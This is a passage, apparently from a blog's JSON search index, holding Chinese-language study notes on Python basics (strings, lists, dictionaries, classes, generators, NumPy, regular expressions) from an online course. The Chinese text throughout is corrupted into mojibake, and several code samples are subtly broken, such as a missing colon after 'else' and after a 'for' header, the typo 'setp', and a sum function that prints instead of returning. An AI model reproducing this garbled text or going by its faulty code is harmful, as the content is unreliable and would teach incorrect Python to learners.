UTF-8ã€‚\n\nç»è¿‡ä»¥ä¸Šä¸¤æ­¥å°±åŸºæœ¬å®Œæˆè®¾ç½®äº†ï¼Œæ–°å»ºé¡¹ç›®ï¼Œå³é”® properties æ£€æŸ¥ç¼–ç æ ¼å¼æ˜¯å¦æ­£ç¡®ã€‚","tags":["tips"]},{"title":"é›†æ™ºè¯¾å ‚ä¹‹ Python å­¦ä¹ ","url":"/2018/02/14/jizhi-python-learning/","content":"\nè¿™æ˜¯åœ¨é›†æ™ºè¯¾å ‚å­¦ä¹ [æ·±åº¦å­¦ä¹ æ‰€éœ€çš„ Python åŸºç¡€](https://jizhi.im/course/dl_python)è¯¾ç¨‹ç¬”è®°ã€‚  \n## åŸºæœ¬æ¦‚å¿µ\n### hello world\n\n```python\nprint(\"hello world\")\n```\n\n### Python\nè§£é‡Šå‹è¯­è¨€ --é€è¡Œè¿è¡Œã€‚\n### å˜é‡\nä½¿ç”¨ `type()` å‡½æ•°å¾—åˆ°å˜é‡ç±»å‹ã€‚  \nä¸åŒç±»å‹å˜é‡æ— æ³•ç›¸åŠ ã€‚  \nè¿è¡Œ `help()` è¿›å…¥å¸®åŠ©æ¨¡å¼ï¼Œè¾“å…¥ `keywords` å¾—åˆ°å…³é”®å­—åˆ—è¡¨ã€‚  \nå˜é‡ç±»å‹è½¬æ¢å¯ä»¥ä½¿ç”¨ `float()`, `int()`, `str()` ç­‰å‡½æ•°ã€‚\n\n### æ•°å€¼\nPython æ”¯æŒçš„ 3 ç§æ•°å€¼ç±»å‹ï¼š`int`ï¼Œ `float`ï¼Œ `complex`ï¼ˆå¤æ•°ï¼‰ã€‚  \næŒ‡æ•°è¿ç®—ç¬¦æ˜¯ `**`ï¼Œ`^` åœ¨ Python ä¸­è¡¨ç¤ºäºŒè¿›åˆ¶æŒ‰ä½è¿ç®—ã€‚  \nPython ä¸æ”¯æŒä¸€å…ƒåŠ å‡æ“ä½œï¼ˆ`++` æˆ– `--`ï¼‰ã€‚\n### å¸ƒå°”å€¼\nå’Œå…¶ä»–è¯­è¨€ç±»ä¼¼\n### å­—ç¬¦ä¸²\nå¯ä»¥ç”¨ `str()` å‡½æ•°å°†å…¶ä»–ç±»å‹å˜é‡è½¬ä¸ºå­—ç¬¦ä¸²ã€‚  \nå¯ä»¥é€šè¿‡ å­—ç¬¦ä¸²å˜é‡å[ç´¢å¼•å€¼] çš„æ–¹æ³•è®¿é—®å­—ç¬¦ä¸²ä¸­æŸä¸ªå…·ä½“çš„å­—ç¬¦ã€‚  \n`+` å·å¯ä»¥æ‹¼æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œ`*` å·å¯ä»¥å¤åˆ¶å­—ç¬¦ä¸²ã€‚  \nå¯ä»¥é€šè¿‡ å­—ç¬¦ä¸²å˜é‡å `[start:end]` å¯¹å­—ç¬¦ä¸²è¿›è¡Œåˆ‡å‰²ï¼Œè¿”å›ç¬¬ `start` åˆ° `end-1` çš„å­—ç¬¦ï¼Œè´Ÿæ•°ç´¢å¼•è¡¨ç¤ºå€’æ•°ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦å³æ˜¯ `[-1]`ã€‚  \n`in` å’Œ `not in` å¯ä»¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ…å«å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå«æˆå‘˜è¿ç®—ç¬¦ã€‚  \nå­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°ï¼š\n\nå‡½æ•°å | å‡½æ•°è¿”å›å€¼\n:-: | :-\nlen() | è¿”å›å­—ç¬¦ä¸²é•¿åº¦\nmax() | è¿”å›å­—ç¬¦ä¸² ASCII æœ€å¤§çš„å­—ç¬¦\nmin() | è¿”å›å­—ç¬¦ä¸² ASCII æœ€å°çš„å­—ç¬¦\nord() | è¿”å›å­—ç¬¦å¯¹åº”çš„ ASCII ç¼–ç \nchr() | è¿”å› ASCII ç¼–ç æ‰€ä»£è¡¨çš„å­—ç¬¦\n## è¿›é˜¶å¯¹è±¡\n### å…³ç³»è¿ç®—ç¬¦\n`if` è¯­å¥\n```python\nif condition1:\n    # branch\nelif condition2:\n    # branch\nelse\n    # ä»€ä¹ˆä¹Ÿä¸åšç”¨ pass å¡«å……\n```\n### æ§åˆ¶æµ-1\n`for` å¾ªç¯\n```python\nfor i in iterable_object:\n    # loop body\n```\n`range()` å‡½æ•°\n```python\nfor i in range(3):\n    # i -> 0, 1, 2\nfor i in range(2, 5):\n    # i -> 2, 3, 4  range(a,b)ä¸­ï¼Œå¦‚æœ a > bï¼Œåˆ™è¿”å›ç©ºæ•°ç»„\nfor i in range(0, 6, 2):\n    # i -> 0, 2, 4  ç¬¬ä¸‰ä¸ªæ•°æ˜¯æ­¥é•¿\n```\n`while` å¾ªç¯\n```python\nwhile condition:\n    # loop body\n```\n### æ§åˆ¶æµ-2\n`break` è¯­å¥å’Œ `continue` è¯­å¥\n### åˆ—è¡¨\né€šè¿‡ `,` åˆ†éš”ï¼Œç”± `[ ]` åŒ…å«ã€‚  \nåˆ—è¡¨çš„å…ƒç´ å¯ä»¥æ˜¯ä¸åŒç±»å‹ï¼Œåˆ—è¡¨æœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºå…ƒç´ ã€‚  \nåˆ›å»ºåˆ—è¡¨å¯ä»¥é€šè¿‡ï¼š\n```python\nl = [ ]\nl = list()\nl = list(\"jizhi\") # l = ['j', 'i', 'z', 'h', 'i']\n```\n`len()` å‡½æ•°å¯ä»¥è·å–åˆ—è¡¨å…ƒç´ ä¸ªæ•°ã€‚  \nåˆ—è¡¨çš„è®¿é—®å’Œåˆ‡å‰²ä¸å­—ç¬¦ä¸²ç±»ä¼¼ï¼Œ`[ ]` å†…å†™ç´¢å¼•å€¼æˆ– `start:end`ã€‚  \n`+` ç”¨äºæ‹¼æ¥ï¼Œ `*` å¤åˆ¶åˆ—è¡¨å†…å…ƒç´ ã€‚  \nå¸¸ç”¨åˆ—è¡¨æ–¹æ³•å¦‚ä¸‹\n\n|       æ–¹æ³•       | è¾“å…¥å€¼ç±»å‹ | è¿”å›å€¼ç±»å‹ |                   æè¿°                    |\n| :--------------: | :--------: | :--------: | :---------------------------------------: |\n|    append(x)     |   object   |    None    |  åœ¨ list çš„æœ€åæ·»åŠ ä¸€ä¸ªå…ƒç´ ï¼Œæ²¡æœ‰è¿”å›å€¼   |\n|     count(x)     |   object   |    int     | è¿”å›å…ƒç´  x åœ¨ list ä¸­å‡ºç°çš„æ¬¡æ•°ï¼Œè¿”å›æ•´æ•° |\n|    extend(l)     |    list    |    None    |       å°†åˆ—è¡¨ l ä¸­çš„å…ƒç´ å…¨éƒ¨ append        |\n|     index(x)     |   object   |    int     |     è¿”å›åˆ—è¡¨ä¸­å‡ºç°çš„ç¬¬ä¸€ä¸ª x çš„ç´¢å¼•å€¼     |\n| insert(index, x) |    int     |    None    |        å°†å…ƒç´  x æ’å…¥åˆ°æŒ‡å®šç´¢å¼•ä½ç½®        |\n|    remove(x)     |   object   |    None    |      ä»åˆ—è¡¨ä¸­æå‡ºç¬¬ä¸€ä¸ªå‡ºç°çš„å…ƒç´  x       |\n|    reverse()     |    None    |    None    |               å€’è½¬åˆ—è¡¨å…ƒç´                 |\n|      sort()      |    None    |    None    |               æ­£åºæ’åˆ—å…ƒç´                 |\n|    sorted(l)     |    list    |    list    |          å¯¹åˆ—è¡¨ l ä¸´æ—¶æ’åºå¹¶è¿”å›          |\n|      pop(i)      |    int     |   object   |         åˆ é™¤å¹¶è¿”å›æŒ‡å®šä½ç½®çš„å…ƒç´           |\n\nåˆ—è¡¨æ¨å¯¼å¼\n\n```python\nl1 = [x for x in range(10)]\n# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n# åˆ›å»º0-9çš„åˆ—è¡¨\nl2 = [x + 1 for x in range(10)]\n# [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n# åˆ›å»º1-10çš„åˆ—è¡¨\nl3 = [x for x in range(10) if x % 2 ==0]\n# [0, 2, 4, 6, 8]\n# 10ä»¥å†…å¶æ•°åˆ—è¡¨\n```\n### å­—å…¸\nå­—å…¸ä¹Ÿå³æ˜¯ Python ä¸­çš„é”®å€¼å¯¹ã€‚  \næ·»åŠ æˆ–ä¿®æ”¹å­—å…¸ä¸­å…ƒç´ ç›´æ¥ç”¨ `=` ç»™ç›®æ ‡å¤åˆ¶å³å¯ã€‚  \nåˆ é™¤æŸä¸ªé”®å€¼å¯¹ç›´æ¥ç”¨ `del` ï¼Œåé¢ç©ºæ ¼æ¥å¯¹åº”çš„é”®å°±å¯ä»¥ã€‚  \n`del heros[\"superman\"]`  \nå­—å…¸å¾ªç¯\n```python\nfor key in heros:\n    # loop body\n```\nå­—å…¸å¸¸ç”¨æ–¹æ³•\n\næ–¹æ³• | æè¿°\n:-: | :-:\npopitem() | è¿”å›å¹¶åˆ é™¤ä¸€ä¸ªéšæœºå…ƒç´ \nclear() | åˆ é™¤å­—å…¸å†…æ‰€æœ‰å…ƒç´ \nkeys() | è¿”å›å­—å…¸çš„æ‰€æœ‰é”®\nvalues() | è¿”å›å­—å…¸çš„æ‰€æœ‰å€¼\nget(key) | è¿”å›é”®å¯¹åº”çš„å€¼ï¼Œä¸å­˜åœ¨åˆ™è¿”å› None\npop(key) | ç¿»å‡ºå¹¶è¿”å›é”®å¯¹åº”å€¼\n### å…ƒç»„\nå…ƒç»„å’Œåˆ—è¡¨ç›¸è¿‘ï¼Œä½†æ˜¯å…ƒç»„ä½¿ç”¨åœ†æ‹¬å·`( )`è€Œä¸æ˜¯æ–¹æ‹¬å·`[ ]`æ¥æ ‡å¿—ï¼Œ**å…ƒç»„ä¸€æ—¦åˆ›å»ºï¼Œå°±ä¸èƒ½å†æ·»åŠ ã€åˆ é™¤æˆ–ä¿®æ”¹å…¶ä¸­çš„å…ƒç´ ï¼Œå…ƒç»„æ˜¯ä¸å¯ä¿®æ”¹çš„**ï¼Œè¿™ä¸€ç‚¹å’Œå­—ç¬¦ä¸²æ€§è´¨ç›¸åŒ  \n#### åˆ›å»ºå…ƒç»„\n```python\n# åˆ›å»ºç©ºå…ƒç»„\nt1 = ()\n# ç›´æ¥åˆ›å»ºå…ƒç»„\nt2 = (1, 2, 3, 4)\n# ä»æ•°ç»„åˆ›å»º\nt3 = tuple([1, 2, 3, 4])     # (1, 2, 3, 4)\n# ä»å­—ç¬¦ä¸²åˆ›å»º\nt4 = tuple(\"è°ˆç¬‘é£ç”Ÿ\")        # ('è°ˆ', 'ç¬‘', 'é£', 'ç”Ÿ')\n```\nå…ƒç»„å…³é”®å­—æ˜¯ `,` è€Œä¸æ˜¯ `()`ã€‚\n### å˜æ€§ä¸å˜æ€§\nåˆ—è¡¨æ˜¯ `å¯å˜çš„(mutable)`ï¼Œæˆ‘ä»¬åˆ æ”¹å…¶ä¸­çš„å…ƒç´ ï¼Œè¯¥åˆ—è¡¨åœ¨å†…å­˜ä¸­çš„åœ°å€è¿˜æ˜¯ä¸€æ ·çš„ã€‚  \nå­—ç¬¦ä¸²æ˜¯`ä¸å¯å˜çš„(immutable)`ï¼Œä¿®æ”¹åäº§ç”Ÿæ–°å­—ç¬¦ä¸²åæ—§å­—ç¬¦ä¸²å¤±å»å¼•ç”¨åˆ™è¢«å†…å­˜å›æ”¶ã€‚\n```python\n# åˆ›å»ºå˜é‡ str1ï¼ŒæŒ‡å‘å€¼ \"jizhi\"\nstr1 = \"jizhi\"\nprint(id(str1))\n\n# å°è¯•æ”¹å˜ str1ï¼Œä½†å…¶å®å¹¶æ²¡æœ‰æ”¹å˜å€¼ \"jizhi\"\nstr1 += \".im\"\n\n# str1 åªæ˜¯æŒ‡å‘äº†å¦ä¸€ä¸ªå€¼ \"jizhi.im\"\nprint(id(str1))\n```\n## é¢å‘å¯¹è±¡\n### æ–‡ä»¶\nå¯¹æ–‡ä»¶çš„åŸºæœ¬æ“ä½œ\n```python\nopen(\"test.txt\", \"r\")\n# ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•° r ä»£è¡¨åªè¯»ï¼Œ w ä»£è¡¨å†™å…¥ï¼Œ a ä»£è¡¨å¢è¡¥\n\nf = open(\"test.txt\", \"r\")\n# f å˜é‡å¹¶ä¸æ˜¯æ–‡æœ¬å†…å®¹ï¼Œç±»å‹ä¸º TextIOWrapperï¼Œå†…å®¹åŒ…å«æ–‡ä»¶å(name)ï¼Œæ‰“å¼€æ–¹å¼(mode)å’Œç¼–ç æ ¼å¼(encoding)ä¸‰ä¸ªå‚æ•°\n\nnovel = f.read()\n# f æ˜¯ TextIOWrapperå¯¹è±¡ï¼Œéœ€è¦ read()æ–¹æ³•æ‰èƒ½å¾—åˆ°æ–‡ä»¶å†…å®¹,read() å‡½æ•°çš„è¿”å›å€¼æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å€¼\n```\n### å‡½æ•°\nå®šä¹‰å‡½æ•°\n```python\ndef function(argument):\n    # function body\n    value = 1\n    return value\n```\n### ç±»å’Œå¯¹è±¡\nå®šä¹‰ç±»\n```python\nclass Creature (object): # æ‹¬å·å†…æ˜¯è¶…ç±»\n    # statements\n    pass # è¡¨ç¤ºè¿™ä¸ªç±»ä»€ä¹ˆä¹Ÿä¸åš\n```\nå®ä¾‹å˜é‡ï¼šä½¿ç”¨æ„é€ å™¨\n```python\nclass Person:\n    def __init__(self, name):\n        self.name = name\n\n    def getName(self):\n        return self.name\n\ngreenlihui = Person(\"greenlihui\")\ngreenlihui.getName() # print è¿™è¡Œè¯­å¥ä¼šå¾—åˆ° greenlihui\n```\nPython æ‰€æœ‰æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯ `self`ï¼Œè¯¥å‚æ•°æŒ‡ä»£è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ï¼›è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¸éœ€è¦ä¼ å…¥ `self` å‚æ•°ï¼ŒPython è§£é‡Šå™¨ä¼šè‡ªåŠ¨å®Œæˆè¿™ä¸€æ­¥ã€‚\n### ç±»å’Œå¯¹è±¡-2\n#### éšè—å®ä¾‹å˜é‡  \nåœ¨å‰é¢çš„ç¨‹åºä¸­ï¼ŒPerson è¢«å®ä¾‹åŒ–å¹¶èµ‹äºˆåå­—åï¼Œå…¶å¯¹è±¡çš„åå­—ä¾ç„¶å¯ä»¥ é€šè¿‡ `object.name = \"\"` è¢«ä¿®æ”¹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸å¸Œæœ›å¯ä»¥è¿™æ ·ï¼Œæ‰€ä»¥éœ€è¦éšè—è¿™äº›å®ä¾‹å˜é‡ï¼Œå³å®šä¹‰ `ç§æœ‰å®ä¾‹å˜é‡`ã€‚åœ¨ Python ä¸­ï¼Œä»¥ä¸¤æ¡ä¸‹åˆ’çº¿ `__` å¼€å¤´çš„å˜é‡å°±æ˜¯ç§æœ‰å®ä¾‹å˜é‡ï¼Œæ–¹æ³•åŒæ ·å¯ä»¥å®šä¹‰ä¸ºç§æœ‰ï¼Œä¹Ÿæ˜¯ä¸¤æ¡ä¸‹åˆ’çº¿å¼€å¤´ã€‚  \nè¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯å˜é‡åå‰é¢æœ‰å•ä¸‹åˆ’çº¿ `_`ï¼Œè¿™ç§å«åš `ä¿æŠ¤å˜é‡`ï¼Œåªæœ‰ç±»åŠå…¶å­ç±»å¯ä»¥è®¿é—®ã€‚  \næ„é€ å™¨æ–¹æ³• `__init__()` å‰åéƒ½æœ‰ `__` ï¼Œè¿™ç§å‰åéƒ½æœ‰åŒä¸‹åˆ’çº¿çš„å†™æ³•ï¼Œæ˜¯ Python å†…ç½®ç‰¹æ®Šæ–¹æ³•çš„æ ‡å¿—ï¼Œæˆ‘ä»¬å‘½åæ–¹æ³•æ—¶åº”é¿å…è¿™ç§æƒ…å†µã€‚\n#### è¿ç®—ç¬¦é‡è½½  \næˆ‘ä»¬å¯ä»¥ç”¨ `+` è¿›è¡Œæ•°å­¦è¿ç®—ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œåœ¨è¿™ä¸¤ç§æƒ…å½¢ä¸­ `+` å®Œå…¨æ˜¯ä¸åŒçš„å«ä¹‰ã€‚å› ä¸º `+` è¿ç®—ç¬¦åœ¨ `int` ç±»å’Œ `str` ç±»ä¸­åˆ†åˆ«è¿›è¡Œäº†é‡è½½ã€‚å¦‚æœæƒ³åœ¨è‡ªå®šä¹‰çš„å¯¹è±¡ä¸­ä½¿ç”¨ `+`ï¼Œåˆ™éœ€è¦å®šä¹‰åä¸º `__add__` çš„æ–¹æ³•ã€‚  \nåœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œå®šä¹‰ç±»å‡ ä½•å›¾å½¢ åœ† çš„ç±»ï¼Œé‡è½½äº†è¿ç®—ç¬¦`+`ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `+` ä½¿ä¸¤ä¸ªåœ†åŠå¾„ç›¸åŠ æ±‚å‡ºå’Œã€‚\n```python\nimport math\nclass Circle:\n    def __init__(self, radius):\n        self.__radius = radius\n    \n    def setRadius(self, radius):\n        self.__radius = radius\n    \n    def getRadius(self, radius):\n        return self.__radius\n\n    def area(self):\n        return math.pi * self.__radius ** 2\n    \n    def __add__(self, another_circle):\n        return Circle(self.__radius + another_circle.__radius)\n\nc1 = Circle(4)\nc2 = Circle(5)\nc3 = c1 + c2 # æ­¤æ—¶ï¼Œc3 æ˜¯åŠå¾„ä¸º 9 çš„åœ†å¯¹è±¡\n```\nPython è¿˜æä¾›å¾ˆå¤šå…¶ä»–çš„è¿ç®—ç¬¦å¯ä¾›é‡è½½ï¼Œå¦‚ä¸‹ï¼š\n\n| è¿ç®—ç¬¦  |         å‡½æ•°         |   æè¿°   |\n| :-----: | :------------------: | :------: |\n|    +    |   add(self, other)   |   åŠ æ³•   |\n|    -    |   sub(self, other)   |   å‡æ³•   |\n|    *    |   mul(self, other)   |   ä¹˜æ³•   |\n|    /    | truediv(self, other) |   é™¤æ³•   |\n|    %    |   mod(self, other)   |   ä½™æ•°   |\n|    <    |   lt(self, other)    |   å°äº   |\n|   <=    |   le(self, other)    | å°äºç­‰äº |\n|   ==    |   eq(self, other)    |   ç­‰äº   |\n|   !=    |   ne(self, other)    |  ä¸ç­‰äº  |\n|    >    |   gt(self, other)    |   å¤§äº   |\n|   >=    |   ge(self, other)    | å¤§äºç­‰äº |\n| [index] | getitem(self, index) |   ç´¢å¼•   |\n|   in    |       contains       |   ä»å±   |\n|   len   |      len(self)       | å…ƒç´ ä¸ªæ•° |\n|   str   |       str(len)       | å­—ç¬¦è¡¨å¾ |\n\n**é‡è½½å‡½æ•°å‰åè¦åŠ åŒä¸‹åˆ’çº¿**\n### ç»§æ‰¿ä¸æ´¾ç”Ÿ\n#### åˆ›å»ºå­ç±»\n\n```python\nclass sub_class(super_class):\n    # å®ä¾‹å˜é‡\n    # å®ä¾‹æ–¹æ³•\n```\n\nç»§æ‰¿åŸºæœ¬æ€æƒ³ä¸åšè¿‡å¤šé˜è¿°ï¼Œä¸ `C#`ï¼Œ`Java` è¿™äº›è¯­è¨€ä¸åŒï¼ŒPython å…è®¸å¤šé‡ç»§æ‰¿ã€‚\n\n```python\nclass Subclass(SuperClass1, SuperClass2, ...):\n    # initializer\n    # methods\n```\n## èŠ±å¼æ“ä½œ\n### ç”¨æˆ·è¾“å…¥\n```python\nmessage = input(\"Tell me something, and I will repeat it back to you: \")\n# ä¸Šé¢è¿™è¡Œè¯­å¥ä¼šè¾“å‡ºæ‹¬å·å†…çš„æç¤ºå­—ç¬¦ä¸²ï¼Œç„¶åç­‰å¾…ç”¨æˆ·è¾“å…¥èµ‹å€¼ç»™ message å˜é‡\nprint(message)\n```\nç±»ä¼¼åœ°ï¼Œä½¿ç”¨å‡½æ•° `int()` å¯ä»¥è·å–æ•°å€¼è¾“å…¥ã€‚ï¼ˆæ‹¬å·å†…åŒæ ·å¯ä»¥æŠŠæç¤ºä½œä¸ºå‚æ•°ï¼‰\n### Lambda å‡½æ•°\n`Lambda` å‡½æ•°å¾ˆç®€å•ï¼Œåªèƒ½åŒ…å«ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¡¨è¾¾å¼çš„ç»“æœå°±æ˜¯ `Lambda` å‡½æ•°çš„å€¼ï¼Œä¸éœ€è¦å•ç‹¬è®¾å®š `return` å…³é”®å­—ã€‚  \n```python\n# ä¹˜æ³•çš„æ™®é€šå‡½æ•°å®ç°æ–¹å¼\ndef multiply(x, y):\n    return x * y\n\n# ç”¨ Lambda å®ç°æ–¹å¼\nmul = lambda x, y : x * y\nmul(111, 6) # å’Œ multiply(111, 6) è¿è¡Œç»“æœä¸€è‡´\n```\n### å‡½æ•°çš„å‚æ•°\n#### é»˜è®¤å‚æ•°  \nå¯¹äºæ–¹æ³•å¤´ `def sum(a, b, c=0):`ï¼Œå¦‚æœè°ƒç”¨å‡½æ•°æ—¶æ²¡æœ‰æŒ‡å®šå‚æ•° `c`ï¼Œ åˆ™è‡ªåŠ¨ä»£å…¥é»˜è®¤å€¼ `0`ã€‚\n#### ä»»æ„æ•°é‡å‚æ•°  \n`*args` å¯ä»¥è®©å‡½æ•°æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ï¼Œå’Œ `Java` `...args`å‚æ•°ç±»ä¼¼ï¼Œå°†è‹¥å¹²ä¸ªè¾“å…¥å‚æ•°å­˜å…¥ä¸€ä¸ªåˆ—è¡¨ã€‚\n```python\ndef sum(*args):\n    s = 0\n    for i in args:\n        s += i\n    print(\"Sum is:\", s)\n\nprint(sum(1, 2, 3)) # è¾“å‡º Sum is: 6\nprint(sum(1, 2, 3, 4)) # è¾“å‡º Sum is: 10\n# args ä¸æ˜¯å¼ºåˆ¶å‘½åï¼Œç”¨ *my_args ä¹Ÿå¯ä»¥\n```\n#### å…³é”®å­—å‚æ•°\n`**kwargs` å’Œ `*args` ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºå‰è€…æ¥å—çš„å‚æ•°å¸¦æœ‰å…³é”®å­—ï¼Œå½¢å¼å¦‚ `my_func(name='greenlihui', age=20)`ï¼›**`kwargs`æŠŠå‚æ•°å­˜å…¥ä¸€ä¸ªå­—å…¸ï¼Œç”¨é”®å€¼å¯¹çš„å½¢å¼è¡¨ç¤ºç‰¹å¾å­—ä¸å‚æ•°çš„æ˜ å°„å…³ç³»ã€‚**\n```python\ndef my_func(**kwargs):\n    for i in kwargs.items():\n        print(i)\n\nmy_func(name='greenlihui', age=20)\n# è¾“å‡ºå¦‚ä¸‹\n# ('name', 'greenlihui')\n# ('age', 20)\n```\n### ç”Ÿæˆå™¨\n#### è¿­ä»£å™¨  \nå¯ä»¥å¾ªç¯éå†çš„æ•°æ®ç±»å‹éƒ½æ˜¯`å¯è¿­ä»£çš„`ï¼Œè¦åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯ä¸æ˜¯å¯è¿­ä»£çš„ï¼Œåªè¦é€šè¿‡ `isinstance(object, Iterable)` åˆ¤æ–­å®ƒæ˜¯å¦æ˜¯ `Iterable` çš„å®ä¾‹(isinstance è¿”å› `true` æˆ–è€… `false`)ã€‚  \nå¯è¿­ä»£ä¸ä»£è¡¨å®ƒæ˜¯è¿­ä»£å™¨ï¼Œè¿­ä»£å™¨çš„ä¸€å¤§ç‰¹ç‚¹å°±æ˜¯é€šè¿‡ `next()` å‡½æ•°å¯ä»¥è¿”å›è¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚æˆ–è€…å¦‚æœæ²¡æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™æŠ›å‡º `StopIteration` å¼‚å¸¸ã€‚\n```python\nheights = [1, 2, 3, 4]\nheights_iter = iter(heights)\n# å…ˆé€šè¿‡ iter() å‡½æ•°å°†åˆ—è¡¨è½¬åŒ–æˆè¿­ä»£å™¨\n\nprint(next(heights_iter))\nprint(next(heights_iter))\nprint(next(heights_iter))\nprint(next(heights_iter))\n```\n#### ç”Ÿæˆå™¨  \nç”Ÿæˆå™¨æ˜¯ç”¨äºäº§ç”Ÿè¿­ä»£å™¨çš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ç”¨äº for å¾ªç¯ã€‚ç”Ÿæˆå™¨ä¸å‡½æ•°çš„å®šä¹‰æ–¹æ³•ç›¸ä¼¼ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ç”¨ `yield` å…³é”®å­—æ¥è¿”å›ç”¨äºæ¯æ¬¡è¿­ä»£çš„å€¼ã€‚\n```python\ndef my_range(start, stop, step = 1):\n    i = start\n    while i < stop:\n        yield i\n        i += setp\n\nfor k in my_range(11, 45)\n    print(k)\n# å°†ä¼šè¾“å‡ºæ•´æ•° 11 ï½ 44\n```\n### æ¨¡å—\nPython ä¸­çš„æ¨¡å—ä»å½¢å¼ä¸Šè®²å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ Python æ–‡ä»¶ï¼Œé‡Œé¢é¢„å­˜äº†å†™å¥½çš„å‡½æ•°ã€å˜é‡ã€ç±»å’Œå¯¹è±¡ã€‚\n#### å¯¼å…¥æ¨¡å—\n```python\n# å¯¼å…¥æ¨¡å—\nimport module_name as mn\nmn.function_name()\n# å¯¼å…¥æ¨¡å—ç‰¹å®šå‡½æ•°\nfrom module_name import function_name\nfunction_name()\nfrom module_name import function_0, function_1, function_2\nfunction_0()\n# å¯¼å…¥æ¨¡å—æ‰€æœ‰å‡½æ•°\nfrom module_name import function_name as func\n```\n#### NumPy  \n`NumPy` æ˜¯ä¸€ä¸ªç”¨äºæ•°å€¼è®¡ç®—çš„æ¨¡å—ï¼Œç°åœ¨å·²ç»å’Œ `SciPy` åˆå¹¶ç±»ã€‚[å®˜æ–¹ç½‘ç«™](scipy.org) å’Œ [Quickstart Tutorial](https://docs.scipy.org/doc/numpy-dev/user/quickstart.html) è¿™é‡Œç»™å‡ºï¼Œæ•°å€¼è®¡ç®—åœ¨æ·±åº¦å­¦ä¹ é¢†åŸŸä¸­å æœ‰é‡è¦åœ°ä½ã€‚  \n`NumPy` æä¾›ä¸€ç§å…¨æ–°çš„æ•°æ®ç»“æ„ `ndarray` (N ç»´æ•°ç»„ï¼Œä¹Ÿå³é«˜ç»´å¼ é‡)ï¼Œä¸åˆ—è¡¨æœ‰ç›¸ä¼¼ä¹‹å¤„ä½†æ˜¯ `ndarray` å†…çš„å…ƒç´ å¿…é¡»æ˜¯ç›¸åŒçš„æ•°æ®ç±»å‹è€Œä¸” `ndarray` çš„å¤§å°æ˜¯å›ºå®šçš„ã€‚\n```python\nimport numpy as np\n\n# çŸ¢é‡ç›¸ä¹˜\nu = np.array([1, 1, 4])\nv = np.array([5, 1, 4])\na = np.dot(u, v)\n```\n### æ­£åˆ™è¡¨è¾¾å¼\nPython å†…ç½®æ­£åˆ™è¡¨è¾¾å¼æ¨¡å—ï¼Œå¯¼å…¥ `import re` å³å¯ä½¿ç”¨ã€‚\n#### re.search()  \n`search()` æ–¹æ³•ç”¨äºå¯»æ‰¾å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåŒ¹é…æ¨¡å¼çš„éƒ¨åˆ†ï¼š\n```python\nimport re\nre.search(pattern, string, flags[optional])\n# è‹¥åŒ¹é…æˆåŠŸï¼Œè¿”å› match å¯¹è±¡ï¼Œå¦åˆ™è¿”å› Noneã€‚\n# match å¯¹è±¡æ‹¥æœ‰ group() æ–¹æ³•ï¼Œå¯ä»¥è¾“å‡ºåŒ¹é…çš„å­—ç¬¦ã€‚\n# pattern å¿…é¡»æ˜¯åŸå§‹å­—ç¬¦ä¸²(raw strings)ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸ª rï¼›åŸå§‹å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„ç‰¹æ®Šæ ‡è¯†ç¬¦éƒ½å˜å›æ™®é€šå­—ç¬¦ï¼Œæ¯”å¦‚ \\n è¡¨ç¤ºåæ–œæ  å’Œ n\n```\nç¤ºä¾‹\n```python\nimport re\ns = \"my number is 123\"\nmatch = re.search(r'\\d\\d\\d', s)\n\nprint(match) # è¾“å‡ºè¯¥ <match> å¯¹è±¡\nprint(match.group()) # è¾“å‡º123\n```\næ­£åˆ™è¡¨è¾¾å¼çš„åŸºæœ¬æ¨¡å¼ï¼š  \n\n|   ç¬¦å·   |               åŒ¹é…               |\n| :------: | :------------------------------: |\n|    .     |     é™¤å¼€ç©ºç™½å­—ç¬¦å¤–çš„ä»»æ„å­—ç¬¦     |\n|    \\w    | ä»»æ„è¯æ±‡å­—ç¬¦ï¼Œå¦‚å­—æ¯æ•°å­—å’Œä¸‹åˆ’çº¿ |\n|    \\W    |            éè¯æ±‡å­—ç¬¦            |\n|    \\d    |             å•ä¸ªæ•°å­—             |\n|    \\D    |            éå•ä¸ªæ•°å­—            |\n|    \\s    |   ç©ºç™½å­—ç¬¦ï¼Œå¦‚ \\n,\\t, space ç­‰   |\n|    \\S    |            éç©ºç™½å­—ç¬¦            |\n|  [abc]   |           é›†åˆä¸­çš„å­—ç¬¦           |\n|  [^abc]  |           é›†åˆå¤–çš„å­—ç¬¦           |\n|  [a-z]   |        èŒƒå›´åœ¨ a-z çš„å­—ç¬¦         |\n| [a-zA-Z] |     èŒƒå›´åœ¨ a-z æˆ– A-Z çš„å­—ç¬¦     |\n|  